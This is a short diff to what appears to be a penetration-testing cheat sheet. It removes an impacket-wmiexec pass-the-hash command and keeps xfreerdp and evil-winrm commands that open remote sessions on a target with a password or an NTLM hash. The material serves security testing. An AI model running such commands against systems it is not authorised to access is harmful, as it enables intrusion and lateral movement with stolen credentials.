@@ -396,7 +396,6 @@ xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard
 xfreerdp /u:'$USERNAME' /p:'$PASSWORD' /v:'$TARGET' /tls-seclevel:0 /dynamic-resolution +clipboard
 
 [*] (5985) WINRM
-impacket-wmiexec '$USERNAME'@$TARGET -hashes '$HASH'
 evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
 evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 
